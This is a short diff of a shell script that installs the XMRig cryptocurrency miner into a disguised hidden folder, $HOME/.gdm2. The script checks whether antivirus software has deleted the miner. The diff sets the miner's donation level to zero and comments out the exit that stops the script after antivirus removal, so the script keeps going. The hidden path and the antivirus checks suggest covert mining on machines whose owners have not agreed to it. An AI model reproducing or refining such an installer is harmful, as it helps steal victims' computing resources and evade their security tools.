@@ -194,7 +194,7 @@ fi
 #rm xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.gdm2/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
 $HOME/.gdm2/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HOME/.gdm2/xmrig ]; then
@@ -228,7 +228,7 @@ if (test $? -ne 0); then
     else 
       echo "ERROR: Stock version of $HOME/.gdm2/xmrig was removed by antivirus too"
     fi
-    exit 1
+#    exit 1
   fi
 fi
 
